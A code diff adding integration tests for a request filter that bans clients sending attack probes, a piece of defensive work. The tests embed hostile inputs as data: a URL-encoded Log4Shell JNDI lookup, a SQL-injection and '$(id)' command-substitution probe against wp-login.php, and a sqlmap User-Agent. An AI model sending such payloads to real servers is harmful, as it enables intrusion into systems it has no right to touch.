@@ -181,4 +181,63 @@ class SuspiciousRequestFilterIT extends AbstractIT {
         .perform(get("/api/auth/login-options").with(apiPort()).with(remoteAddr(CLIENT)))
         .andExpect(status().isTooManyRequests());
   }
+
+  @Test
+  @DisplayName("two Log4Shell probes in the query ban the client, answered as any other request")
+  void log4ShellProbesBanTheClient() throws Exception {
+
+    final var probe = java.net.URI.create("/api/auth/login-options?q=%24%7Bjndi:ldap://x/a%7D");
+
+    this.mockMvc
+        .perform(get(probe).with(apiPort()).with(remoteAddr(CLIENT)))
+        .andExpect(status().is(org.hamcrest.Matchers.not(429)));
+    this.mockMvc
+        .perform(get(probe).with(apiPort()).with(remoteAddr(CLIENT)))
+        .andExpect(status().is(org.hamcrest.Matchers.not(429)));
+
+    this.mockMvc
+        .perform(get("/api/auth/login-options").with(apiPort()).with(remoteAddr(CLIENT)))
+        .andExpect(status().isTooManyRequests());
+  }
+
+  @Test
+  @DisplayName("a scanner's User-Agent alone never bans, a package manager's counts for nothing")
+  void scannerAgentAloneNeverBans() throws Exception {
+
+    for (var i = 0; i < 12; i++) {
+      this.mockMvc.perform(
+          get("/api/auth/login-options")
+              .header("User-Agent", "sqlmap/1.7.2#stable")
+              .with(apiPort())
+              .with(remoteAddr(CLIENT)));
+      this.mockMvc.perform(
+          get("/api/auth/login-options")
+              .header("User-Agent", "Apache-Maven/3.9.6")
+              .with(apiPort())
+              .with(remoteAddr(OTHER_CLIENT)));
+    }
+
+    this.mockMvc
+        .perform(get("/api/auth/login-options").with(apiPort()).with(remoteAddr(CLIENT)))
+        .andExpect(status().is(org.hamcrest.Matchers.not(429)));
+    this.mockMvc
+        .perform(get("/api/auth/login-options").with(apiPort()).with(remoteAddr(OTHER_CLIENT)))
+        .andExpect(status().is(org.hamcrest.Matchers.not(429)));
+  }
+
+  @Test
+  @DisplayName("a script probe plus an injection on one request, then a second one, ban")
+  void scriptAndInjectionProbesAddUp() throws Exception {
+
+    final var probe =
+        java.net.URI.create("/wp-login.php?log=admin%27%20or%201%3D1&pwd=%24%28id%29");
+
+    // SCRIPT_TARGET 3 + SQLI 2 + CMDI 2 = 7 per request.
+    this.mockMvc.perform(get(probe).with(apiPort()).with(remoteAddr(CLIENT)));
+    this.mockMvc.perform(get(probe).with(apiPort()).with(remoteAddr(CLIENT)));
+
+    this.mockMvc
+        .perform(get("/api/auth/login-options").with(apiPort()).with(remoteAddr(CLIENT)))
+        .andExpect(status().isTooManyRequests());
+  }
 }
